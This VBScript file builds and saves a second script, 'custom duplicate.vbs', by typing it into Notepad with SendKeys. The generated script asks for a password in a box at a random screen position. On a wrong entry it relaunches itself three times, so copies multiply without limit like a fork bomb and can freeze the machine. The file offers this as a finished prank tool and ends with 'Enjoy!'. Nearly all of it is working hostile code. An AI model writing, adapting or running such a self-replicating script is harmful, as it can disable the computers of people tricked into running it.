Option Explicit

dim keyboard, sentence, directory, password, i

set keyboard = createobject("wscript.shell")

do until password <> ""
password = inputbox("Enter the custom password: ")
loop

do until directory <> ""
directory = inputbox("Enter which directory to save the file: ")
loop

msgbox "Please do not touch your keyboard until the operation is done. Press OK to continue...", 64

wscript.sleep 1500

keyboard.run "notepad.exe"

wscript.sleep 1000

function enter_key()
    keyboard.sendkeys "{enter}"
end function

function type_word(sentence)
    keyboard.sendkeys sentence
end function

type_word("Option Explicit")
enter_key()
type_word("")
enter_key()
type_word("dim password, user_input, shell, x, y")
enter_key()
type_word("")
enter_key()
type_word("set shell = createobject+9" & """wscript.shell""" & "+0")
enter_key()
type_word("")
enter_key()
type_word("Randomize")
enter_key()
type_word("x = round+9Int+915000+0*Rnd+9+0" & "+=" & "1+0")
enter_key()
type_word("Randomize")
enter_key()
type_word("y = round+9Int+98500+0*Rnd+9+0" & "+=" & "1+0")
enter_key()
type_word("")
enter_key()
type_word("password = " & Chr(34) & password & Chr(34) & "")
enter_key()
type_word("user_input = inputbox+9" & """Password: """ & ", " & """""" & ", " & """""" & ", x, y+0")
enter_key()
type_word("")
enter_key()
type_word("function duplicate+9+0")
enter_key()

for i = 1 to 3
type_word("shell.run " & """""" & "" & Chr(34) & directory & "\custom duplicate.vbs" & Chr(34) & "" & """""" & "")
enter_key()
next

type_word("end function")
enter_key()
type_word("")
enter_key()
type_word("if not user_input = password then")
enter_key()
type_word("duplicate+9+0")
enter_key()
type_word("end if")

wscript.sleep 1000

type_word("^s")

wscript.sleep 1000

type_word("custom duplicate.vbs")
type_word("{F4}")
type_word("^a")
type_word("{BS}")
type_word(directory)

for i = 1 to 4
type_word("{ENTER}")
wscript.sleep 1500
next

wscript.sleep 150

type_word("%{F4}")

wscript.sleep 2000

msgbox "Enjoy! " & Chr(34) & directory & "\custom duplicate.vbs" & Chr(34), 64, "Customization Complete"
